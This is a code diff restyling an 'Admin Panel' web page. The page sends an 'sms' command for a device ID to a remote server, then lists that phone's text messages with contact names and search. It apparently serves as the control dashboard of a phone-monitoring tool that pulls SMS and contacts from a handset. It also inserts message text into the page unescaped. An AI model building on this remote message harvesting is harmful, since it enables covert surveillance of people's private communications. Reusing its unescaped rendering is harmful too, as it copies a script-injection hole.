@@ -3,183 +3,308 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SMS Inbox - Admin Panel</title>
+    <title>Messages - Admin Panel</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
-            --bg-color: #0f0f0f;
-            --glass-bg: rgba(255, 255, 255, 0.05);
-            --glass-border: rgba(255, 255, 255, 0.1);
+            --bg-color: #000000;
+            --glass-bg: rgba(28, 28, 30, 0.9);
+            --bubble-received: #262628;
+            --bubble-sent: #0b84ff; /* iPhone Blue */
             --text-main: #ffffff;
-            --text-muted: #aaaaaa;
-            --accent: #4caf50;
+            --text-muted: #8e8e93;
+            --border-color: #38383a;
         }
 
         body {
             background-color: var(--bg-color);
-            background-image: linear-gradient(45deg, #000000, #1a1a1a);
             color: var(--text-main);
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            margin: 0; padding: 20px;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            margin: 0; padding: 10px;
             display: flex; justify-content: center;
         }
 
         .container {
-            width: 100%; max-width: 600px;
-            background: rgba(0, 0, 0, 0.5);
-            border-radius: 30px; padding: 25px;
-            border: 1px solid var(--glass-border);
-            min-height: 80vh;
+            width: 100%; max-width: 500px;
+            background: #000;
+            min-height: 100vh;
+            padding-bottom: 20px;
         }
 
+        /* --- Header & Search --- */
         .header {
-            display: flex; justify-content: space-between; align-items: center;
-            margin-bottom: 30px; padding-bottom: 15px;
-            border-bottom: 1px solid var(--glass-border);
+            position: sticky; top: 0;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(10px);
+            z-index: 100;
+            padding: 10px 0;
+            border-bottom: 1px solid var(--border-color);
         }
+
+        .top-row {
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 0 10px 10px 10px;
+        }
+
+        .page-title { font-size: 1.8rem; font-weight: bold; }
 
         .back-btn {
-            text-decoration: none; color: var(--text-main);
-            background: var(--glass-bg); width: 40px; height: 40px;
-            border-radius: 50%; border: 1px solid var(--glass-border);
-            display: flex; align-items: center; justify-content: center;
+            color: #0b84ff; font-size: 1.1rem; text-decoration: none;
+            display: flex; align-items: center; gap: 5px;
         }
 
-        .title { font-size: 1.3rem; font-weight: bold; display: flex; align-items: center; gap: 10px; }
-        .title i { color: var(--accent); }
-
-        .refresh-btn {
-            background: var(--glass-bg); border: 1px solid var(--glass-border);
-            color: white; padding: 8px 15px; border-radius: 20px; cursor: pointer;
+        .search-box {
+            padding: 0 10px;
         }
 
-        .sms-list { display: flex; flex-direction: column; gap: 15px; max-height: 70vh; overflow-y: auto; padding-right: 5px; }
-        
-        /* Scrollbar */
-        .sms-list::-webkit-scrollbar { width: 5px; }
-        .sms-list::-webkit-scrollbar-thumb { background: var(--glass-border); border-radius: 10px; }
+        .search-input {
+            width: 100%;
+            background: #1c1c1e;
+            border: none;
+            padding: 10px 35px;
+            border-radius: 10px;
+            color: white;
+            font-size: 1rem;
+            box-sizing: border-box;
+        }
+
+        .search-icon {
+            position: absolute; left: 20px; top: 62px; color: var(--text-muted); font-size: 0.9rem;
+        }
+
+        /* --- SMS List --- */
+        .sms-list {
+            display: flex; flex-direction: column; gap: 15px;
+            padding: 15px 10px;
+        }
 
         .sms-card {
-            background: var(--glass-bg); border: 1px solid var(--glass-border);
-            border-radius: 18px; padding: 15px; transition: 0.2s;
+            background: var(--bubble-received);
+            padding: 15px;
+            border-radius: 18px;
+            position: relative;
+            animation: fadeIn 0.3s ease;
         }
-        .sms-card:hover { border-color: var(--accent); background: rgba(255,255,255,0.08); }
 
         .sms-header {
-            display: flex; justify-content: space-between; margin-bottom: 8px;
-            font-size: 0.9rem;
+            display: flex; justify-content: space-between; align-items: flex-start;
+            margin-bottom: 8px;
         }
-        .sender { font-weight: bold; color: var(--accent); }
-        .date { color: var(--text-muted); font-size: 0.75rem; }
+
+        .sender-info {
+            display: flex; flex-direction: column;
+        }
+
+        .sender-name {
+            font-size: 1rem; font-weight: 600; color: #fff;
+        }
+
+        .sender-number {
+            font-size: 0.75rem; color: var(--text-muted); margin-top: 2px;
+        }
+
+        .time-badge {
+            font-size: 0.75rem; color: var(--text-muted);
+            white-space: nowrap;
+        }
 
         .message-body {
-            font-size: 0.95rem; color: #e0e0e0; line-height: 1.5;
-            background: rgba(0,0,0,0.2); padding: 12px; border-radius: 12px;
+            font-size: 0.95rem; color: #e0e0e0; line-height: 1.4;
             word-wrap: break-word;
         }
 
-        .status-msg { text-align: center; padding: 60px; color: var(--text-muted); }
+        /* --- Actions --- */
+        .actions {
+            margin-top: 10px;
+            padding-top: 10px;
+            border-top: 1px solid rgba(255,255,255,0.1);
+            display: flex; justify-content: flex-end;
+        }
+
+        .action-btn {
+            background: none; border: none; color: #0b84ff;
+            cursor: pointer; font-size: 1.2rem;
+            padding: 5px;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        #apiStatus {
+            font-size: 12px; color: var(--text-muted); text-align: center; margin-top: 5px;
+        }
     </style>
 </head>
 <body>
 
     <div class="container">
         <div class="header">
-            <a href="index.html" class="back-btn"><i class="fa-solid fa-chevron-left"></i></a>
-            <div class="title"><i class="fa-solid fa-comments"></i> SMS Inbox</div>
-            <button onclick="fetchSMS()" class="refresh-btn" id="refreshBtn"><i class="fa-solid fa-rotate"></i></button>
+            <div class="top-row">
+                <a href="index.html" class="back-btn"><i class="fa-solid fa-chevron-left"></i> Back</a>
+                <span class="page-title">Messages</span>
+                <button onclick="handleRefresh()" style="background:none; border:none; color:#0b84ff; font-size:1.2rem;" id="refreshBtn">
+                    <i class="fa-solid fa-rotate"></i>
+                </button>
+            </div>
+            
+            <div class="search-box">
+                <i class="fa-solid fa-search search-icon"></i>
+                <input type="text" id="searchInput" class="search-input" placeholder="Search" onkeyup="filterSMS()">
+            </div>
+            <div id="apiStatus">Updated just now</div>
         </div>
 
         <div id="sms-list" class="sms-list">
-            </div>
+            <div style="text-align: center; color: #666; margin-top: 50px;">Waiting for data...</div>
+        </div>
     </div>
 
 <script>
     const SERVER_URL = "https://child-v9no.onrender.com";
-    
-    // URL se Device ID uthana
     const urlParams = new URLSearchParams(window.location.search);
-    const DEVICE_ID = urlParams.get('id');
-    const storageKey = `sms_${DEVICE_ID}`;
+    const DEVICE_ID = urlParams.get('id') ? urlParams.get('id').toUpperCase() : null;
+    
+    const storageKeySMS = `sms_${DEVICE_ID}`;
+    const storageKeyContacts = `contacts_${DEVICE_ID}`;
+
+    let allSMSData = []; // Global variable for fast searching
+    let contactMap = {}; // Fast Name Lookup
 
     document.addEventListener("DOMContentLoaded", function() {
         if (!DEVICE_ID) {
-            alert("Device ID missing! Dashboard se aao.");
-            window.location.href = "index.html";
+            alert("Device ID missing!");
             return;
         }
+        
+        // 1. Prepare Contact Map (Phone -> Name)
+        prepareContactMap();
 
-        // 1. Pehle LocalStorage se load karo
+        // 2. Load Local Data Immediately
         loadFromStorage();
 
-        // 2. Command bhejo aur naya data fetch karo
-        sendCommand();
-        setTimeout(fetchSMS, 3000); 
+        // 3. Background Refresh
+        handleRefresh();
     });
 
-    function loadFromStorage() {
-        const savedData = localStorage.getItem(storageKey);
-        const listContainer = document.getElementById("sms-list");
-        
-        if (savedData) {
-            renderSMS(JSON.parse(savedData));
-        } else {
-            listContainer.innerHTML = `
-                <div class="status-msg">
-                    <i class="fa-solid fa-circle-notch fa-spin" style="font-size:2rem; margin-bottom:10px;"></i>
-                    <p>Requesting Messages from Phone...</p>
-                </div>`;
+    // --- 1. CONTACT MAPPING (Speed Up) ---
+    function prepareContactMap() {
+        const savedContacts = localStorage.getItem(storageKeyContacts);
+        if (savedContacts) {
+            const contacts = JSON.parse(savedContacts);
+            contacts.forEach(c => {
+                // Number clean karo (last 10 digits match karne ke liye)
+                let cleanNum = c.number.replace(/\D/g, '').slice(-10);
+                if(cleanNum) contactMap[cleanNum] = c.name;
+            });
         }
     }
 
-    function sendCommand() {
+    function getContactName(originalNum) {
+        if (!originalNum) return "Unknown";
+        let cleanNum = originalNum.replace(/\D/g, '').slice(-10);
+        return contactMap[cleanNum] || originalNum; // Agar naam mila to naam, warna number
+    }
+
+    // --- 2. DATA LOADING ---
+    function loadFromStorage() {
+        const savedData = localStorage.getItem(storageKeySMS);
+        if (savedData) {
+            allSMSData = JSON.parse(savedData);
+            renderSMS(allSMSData);
+        }
+    }
+
+    function handleRefresh() {
+        // Command bhejo
         fetch(`${SERVER_URL}/api/send-command`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ device_id: DEVICE_ID, command: 'sms' })
         });
+
+        // 4 sec baad fetch karo
+        const btn = document.getElementById("refreshBtn");
+        btn.classList.add("fa-spin");
+        setTimeout(fetchSMS, 4000);
     }
 
     function fetchSMS() {
         const btn = document.getElementById("refreshBtn");
-        btn.innerHTML = '<i class="fa-solid fa-sync fa-spin"></i>';
-
+        
         fetch(`${SERVER_URL}/api/get-data/${DEVICE_ID}/sms?t=${Date.now()}`)
             .then(res => res.json())
             .then(data => {
                 if (data && data.length > 0) {
-                    // 3. LocalStorage mein save karo
-                    localStorage.setItem(storageKey, JSON.stringify(data));
-                    renderSMS(data);
+                    allSMSData = data;
+                    localStorage.setItem(storageKeySMS, JSON.stringify(data));
+                    renderSMS(allSMSData);
+                    document.getElementById("apiStatus").innerText = `Updated: ${new Date().toLocaleTimeString()}`;
                 }
             })
+            .catch(e => console.log(e))
             .finally(() => {
-                btn.innerHTML = '<i class="fa-solid fa-rotate"></i>';
+                btn.classList.remove("fa-spin");
             });
     }
 
+    // --- 3. FILTERING (Search) ---
+    function filterSMS() {
+        const query = document.getElementById('searchInput').value.toLowerCase();
+        
+        const filtered = allSMSData.filter(sms => {
+            const body = (sms.body || "").toLowerCase();
+            const address = (sms.address || "").toLowerCase();
+            const name = getContactName(sms.address).toLowerCase();
+            
+            return body.includes(query) || address.includes(query) || name.includes(query);
+        });
+
+        renderSMS(filtered);
+    }
+
+    // --- 4. RENDERING (The Speed Fix) ---
     function renderSMS(data) {
         const listContainer = document.getElementById("sms-list");
-        listContainer.innerHTML = ""; 
         
-        // Naye SMS upar dikhane ke liye data reverse kar sakte hain agar server se purane pehle aa rahe hon
-        data.forEach(sms => {
-            let dateDisplay = sms.date;
-            if(!isNaN(sms.date)) {
-                dateDisplay = new Date(parseInt(sms.date)).toLocaleString();
+        if (!data || data.length === 0) {
+            listContainer.innerHTML = '<div style="text-align: center; color: #666; margin-top: 50px;">No messages found.</div>';
+            return;
+        }
+
+        // Limit to 100 messages for safety (Browser Crash na ho)
+        const displayData = data.slice(0, 100);
+
+        // 🔥 SUPER FAST TECHNIQUE: Map then Join
+        // Loop ke andar innerHTML mat use karo
+        const htmlString = displayData.map(sms => {
+            const name = getContactName(sms.address);
+            const isSaved = name !== sms.address; // Check agar contact saved hai
+            
+            let dateStr = "";
+            if (!isNaN(sms.date)) {
+                dateStr = new Date(parseInt(sms.date)).toLocaleDateString() + ", " + 
+                          new Date(parseInt(sms.date)).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
             }
 
-            listContainer.innerHTML += `
+            return `
                 <div class="sms-card">
                     <div class="sms-header">
-                        <span class="sender"><i class="fa-solid fa-comment-dots"></i> ${sms.address || 'Unknown'}</span>
-                        <span class="date">${dateDisplay}</span>
+                        <div class="sender-info">
+                            <span class="sender-name">${isSaved ? name : sms.address}</span>
+                            ${isSaved ? `<span class="sender-number">${sms.address}</span>` : ''}
+                        </div>
+                        <span class="time-badge">${dateStr}</span>
                     </div>
                     <div class="message-body">
                         ${sms.body || 'No Content'}
                     </div>
-                </div>`;
-        });
+                </div>
+            `;
+        }).join(''); // Saare HTML ko jod kar ek string bana lo
+
+        listContainer.innerHTML = htmlString; // Sirf ek baar DOM update karo
     }
 </script>
 </body>
